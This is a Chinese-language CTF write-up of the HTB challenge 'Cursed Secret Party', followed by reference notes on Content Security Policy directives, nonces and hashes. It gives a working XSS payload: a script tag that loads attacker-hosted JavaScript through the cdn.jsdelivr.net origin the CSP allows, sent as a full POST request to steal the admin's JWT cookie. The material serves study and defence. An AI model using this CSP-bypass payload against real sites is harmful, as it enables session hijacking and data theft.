---
title: "CSP规则绕过与题目分析"
description: "深入分析CSP（内容安全策略）规则绕过技术，通过HTB CTF中的Cursed Secret Party题目详细讲解CSP绕过方法和防护机制。"
date: "2025-08-30"
tags:
  - "CSP"
  - "XSS"
  - "HTB"
  - "CTF"
  - "WEB安全"
authors:
  - "bx"
draft: false              # 设为 true 则为草稿
slug: "csp-bypass-analysis"          # 随机URL字符串
---
<meta name="referrer" content="no-referrer">

# CSP规则绕过与题目分析
目前记录这么些，感觉是一个十分深入的东西后面再补充

关键点： CSP 本质不是 “防御 XSS 的根工具”，而是 “XSS 的缓冲/减轻机制”



## HTB 中相关题目分析
**Cursed Secret Party  诅咒的秘密派对**

> You've just received an invitation to a party. Authorities have reported that the party is cursed, and the guests are trapped in a never-ending unsolvable murder mystery party. Can you investigate further and try to save everyone?  
你刚刚收到一份派对邀请。当局报告称，这个派对被诅咒了，客人们被困在一个永无止境且无法解决的谋杀之谜派对中。你能进一步调查并尝试拯救所有人吗？
>

我们先进行一些代码分析

先找到 flag 的具体位置

在`bot.js`中

```nginx
const fs = require('fs');
const puppeteer = require('puppeteer');
const JWTHelper = require('./helpers/JWTHelper');
const flag = fs.readFileSync('/flag.txt', 'utf8');

const browser_options = {
	headless: true,
	args: [
		'--no-sandbox',
		'--disable-background-networking',
		'--disable-default-apps',
		'--disable-extensions',
		'--disable-gpu',
		'--disable-sync',
		'--disable-translate',
		'--hide-scrollbars',
		'--metrics-recording-only',
		'--mute-audio',
		'--no-first-run',
		'--safebrowsing-disable-auto-update',
		'--js-flags=--noexpose_wasm,--jitless'
	]
};

const visit = async () => {
    try {
		const browser = await puppeteer.launch(browser_options);
		let context = await browser.createIncognitoBrowserContext();
		let page = await context.newPage();

		let token = await JWTHelper.sign({ username: 'admin', user_role: 'admin', flag: flag });
		await page.setCookie({
			name: 'session',
			value: token,
			domain: '127.0.0.1:1337'
		});

		await page.goto('http://127.0.0.1:1337/admin', {
			waitUntil: 'networkidle2',
			timeout: 5000
		});

		await page.goto('http://127.0.0.1:1337/admin/delete_all', {
			waitUntil: 'networkidle2',
			timeout: 5000
		});

		setTimeout(() => {
			browser.close();
		}, 5000);

    } catch(e) {
        console.log(e);
    }
};

module.exports = { visit };
```

把 flag 直接加载到 admin 的 jwt 中

所以说我们能拿到 admin 的 cookie 就能获得 flag，问题是找能拿到 cookie 的点



题目基本框架

+ 应用类型 ：Node.js + Express Web应用
+ 模板引擎 ：Nunjucks
+ 数据库 ：SQLite
+ 认证机制 ：JWT (JSON Web Token)



看一下这个 admin.html 文件

```html
<html>
  <head>
    <link rel="stylesheet" href="/static/css/bootstrap.min.css" />
    <title>Admin panel</title>
  </head>

  <body>
    <div class="container" style="margin-top: 20px">
      {% for request in requests %} 
      <div class="card">
        <div class="card-header"> <strong>Halloween Name</strong> : {{ request.halloween_name | safe }} </div>
        <div class="card-body">
          <p class="card-title"><strong>Email Address</strong>    : {{ request.email }}</p>
          <p class="card-text"><strong>Costume Type </strong>   : {{ request.costume_type }} </p>
          <p class="card-text"><strong>Prefers tricks or treat </strong>   : {{ request.trick_or_treat }} </p>

          <button class="btn btn-primary">Accept</button>
          <button class="btn btn-danger">Delete</button>
        </div>
      </div>
      {% endfor %}
    </div>

  </body>
</html>
```

这里看Halloween Name 的渲染

```html
{{ request.halloween_name | safe }}
```

`| safe` 会**关闭的自动转义，所以我们考虑使用halloween_name 参数作为攻击点**

我们发现 index.js 设置了一些策略

CSP 安全策略

```nginx
app.use(function (req, res, next) {
    res.setHeader(
        "Content-Security-Policy",
        "script-src 'self' https://cdn.jsdelivr.net ; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; child-src 'self'; frame-src 'self'; worker-src 'self'; frame-ancestors 'self'; form-action 'self'; base-uri 'self'; manifest-src 'self'"
    );
    next();
});
```

只接受本站或者[https://cdn.jsdelivr.net](https://cdn.jsdelivr.net)的 js 脚本

允许从 jsDelivr CDN 拉脚本的话，我们可以构造一下，采用 XSS 攻击诱导获取 admin 的 jwt 得到 flag

后面发现一个其他人使用的一个好用的分析网站

可以利用这个网站去检测一下，安全策略的薄弱点

[https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com/)

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1756960001135-475833b6-4c18-455f-a8b9-7adf5487243d.png)

利用这个网站提供的功能去做一个诱饵，支持 GitHub 代码

新建一个，然后按照对应规则

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1756990315658-bbf1e9e1-7027-4667-bdbd-2086d7f4eca5.png)

```nginx
https://cdn.jsdelivr.net/gh/bx33661/demo@main/1.js

<script src="https://cdn.jsdelivr.net/gh/bx33661/demo@main/1.js"></script>
```

发包请求

```nginx
POST /api/submit HTTP/1.1
Host: 94.237.55.43:52628
Accept: */*
Origin: http://94.237.55.43:52628
Referer: http://94.237.55.43:52628/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Content-Type: application/json
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 174

{"halloween_name":"<script src=\"https://cdn.jsdelivr.net/gh/bx33661/demo@main/1.js\"></script>","email":"bx33661@qq.com","costume_type":"Pick one","trick_or_treat":"tricks"}
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1756959676495-d7891f09-5a3a-42a9-b07e-31d4633f9b5e.png)

得到 admin 的 jwt，解 jwt 得到

```nginx
{
  "username": "admin",
  "user_role": "admin",
  "flag": "HTB{d0n't_4ll0w_cdn_1n_c5p!!}",
  "iat": 1756959656
}
```



##  **脚本与执行相关**
+ `script-src`  
控制 `<script>` 加载来源。支持：
    - `'self'`（同源）
    - `'unsafe-inline'`（允许内联脚本，不推荐）
    - `'unsafe-eval'`（允许 eval/new Function，不推荐）
    - `'nonce-xyz'`（带 nonce 的脚本允许执行）
    - `'sha256-...'`（哈希匹配的脚本允许执行）
+ `script-src-elem`（CSP3）  
专门限制 外部脚本元素 的来源。
+ `script-src-attr`（CSP3）  
专门限制 内联事件属性（如 `<div onclick="...">`）和 `javascript:` URL。



几个概念

### 内联脚本
内联脚本就是，是指直接嵌入在HTML文档中的JavaScript代码，而不是通过外部文件引用的脚本。主要包括以下几种形式：

<script> 标签内的代码，javascript: URL 这些

```html
<script>
  console.log('这是内联脚本');
  alert('Hello World');
</script>

<button onclick="alert('点击了按钮')">点击我</button>
<div onmouseover="this.style.color='red'">鼠标悬停</div>

<a href="javascript:alert('链接被点击')">点击链接</a>
```



###  CSP 里的 nonce 和 sha256 哈希白名单机制  
因为这个`'unsafe-inline'`太宽泛和不安全了，但是确实是需要一些内联脚本的，所以才用这个机制就可以精确的允许特定脚本的执行



### Nonce 机制  
> 这里没有具体说具体开发逻辑，说一下我个人思路
>

**nonce** = 一次性随机数  

具体示例如下

HTTP 响应头

```html
Content-Security-Policy: script-src 'self' 'nonce-randombx33661'
```

在 HTML 中

```html
<script nonce="randombx33661">
  console.log("只允许这个脚本执行");
</script>
```

然后效果就是

只有带上 `nonce="randombx33661"` 的内联脚本会被允许，其它没有 nonce 的内联脚本,包括简单注入的 `<script>alert(1)</script>`会被 CSP 拦掉。  



具体配置代码，感觉能更好理解一下设计 

```javascript
// middleware: 生成随机 nonce
app.use((req, res, next) => {
  const nonce = require('crypto').randomBytes(16).toString('base64');
  res.locals.cspNonce = nonce;

  res.setHeader(
    'Content-Security-Policy',
    [
      "default-src 'self'",
      `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,
      "object-src 'none'",
      "base-uri 'self'",
      "frame-ancestors 'none'",
      "style-src 'self' https://fonts.googleapis.com",   // 如需
      "font-src 'self' https://fonts.gstatic.com",       // 如需
      "img-src 'self' data:",                            // 如需 data: 图
      "connect-src 'self' https://api.example.com"       // 如需 AJAX
    ].join('; ')
  );
  next();
});

```

作为客户端，我们发起一个请求

服务端中间件生成随机 nonce（例如：`abc123xyz`），然后：

响应头：

```plain
Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self' 'nonce-abc123xyz' 'strict-dynamic'; 
  object-src 'none'; 
  base-uri 'self'; 
  frame-ancestors 'none'
```

响应体 (HTML)：

```html
<!doctype html>
<html>
  <head>
    <title>Demo</title>
  </head>
  <body>
    <button id="btn">Click</button>

    <!-- 内联脚本，带 nonce -->
    <script nonce="abc123xyz">
      console.log("我是可信的脚本");
      document.getElementById('btn')
        .addEventListener('click', () => alert('OK'));
    </script>

    <!-- 外链脚本，带 nonce -->
    <script nonce="abc123xyz" src="/static/js/app.bundle.js"></script>

    <!-- 内联脚本，没有 nonce（会被拦截） -->
    <script>
      alert("我没有 nonce，会被 CSP 拦掉");
    </script>
  </body>
</html>
```

结果就是浏览器一边解析 HTML，一边对照 CSP：

+ 发现 `<script nonce="abc123xyz">` ✅ → 允许执行。
+ 发现 `<script nonce="abc123xyz" src="...">` ✅ → 允许加载执行。
+ 发现 `<script>` 没有 nonce ❌ → 阻止执行，并在控制台报错：



### sha256 哈希机制  
就是给脚本内容计算哈希，然后写到 CSP 里。

HTTP 响应头：

```plain
Content-Security-Policy: script-src 'self' 'sha256-X48E9qOokqqrvdts8nOJRJN3OWDUoyWxBf7kbu9DBPE='
```

HTML 里：

```plain
<script>
  console.log("只允许这个脚本执行");
</script>
```

浏览器会计算 `<script>` 内容的 SHA-256 哈希值，和 CSP 里的值对比，如果一致 → 允许执行，否则拦截。



## 其他常见 CSP 规则
>  CSP 的规则其实就是一组 **“资源类型 → 允许来源”** 的映射  
>

一个示例

```nginx
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-ABC123';
  style-src 'self' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com;
  img-src 'self' data:;
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none';
  form-action 'self';
  upgrade-insecure-requests;

```

记录一下 CSP 常见规则和使用说明

#### **全局默认类**
+ `**default-src**`  
默认策略，适用于没有单独声明的资源类型。  
例如：

```plain
Content-Security-Policy: default-src 'self'
```

→ 所有资源（JS、CSS、图片等）都只能来自同源。

可以看一下 MDN 的文档

[内容安全策略（CSP） - HTTP | MDN](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Guides/CSP)

#### **样式相关**
+ `**style-src**`  
控制 `<link rel="stylesheet">` 和 `<style>`。  
常用：`'self'`、`https://fonts.googleapis.com`。
+ `**style-src-elem**` / `**style-src-attr**`（CSP3）  
分别控制 `<link>/<style>` 和内联 `style="..."`。

---

#### **媒体资源相关**
+ `**img-src**`  
图片来源。  
常用：`'self' data:`（允许 base64 图片）。
+ `**font-src**`  
字体文件来源。
+ `**media-src**`  
`<audio>`、`<video>` 来源。
+ `**object-src**`  
`<object>`、`<embed>`、`<applet>`，强烈建议设为 `none`。

---

#### **框架与子资源相关**
+ `**child-src**`  
控制 `<frame>`, `<iframe>`, `<worker>`，⚠️ 已废弃（用下面的替代）。
+ `**frame-src**`  
限制 `<iframe>` 内容来源。
+ `**worker-src**`  
限制 Web Worker / Service Worker 来源。
+ `**frame-ancestors**`  
限制谁能把页面作为 `<iframe>` 嵌入，防御 **Clickjacking**。  
常见配置：`frame-ancestors 'none'`。

---

#### **表单与导航相关**
+ `**form-action**`  
限制 `<form>` 的提交目标。
+ `**base-uri**`  
限制 `<base href="...">`，防止篡改相对路径。
+ `**navigate-to**`（CSP3）  
限制 JS 的导航行为（如 `window.location`、`window.open`）。

---

#### **连接相关**
+ `**connect-src**`  
限制 XHR / Fetch / WebSocket / EventSource 的连接目标。  
例如：

```plain
connect-src 'self' https://api.example.com
```

+ `**manifest-src**`  
限制 PWA manifest.json 来源。
+ `**prefetch-src**`（CSP3）  
限制 `<link rel="prefetch">`、`prerender` 等预取资源。



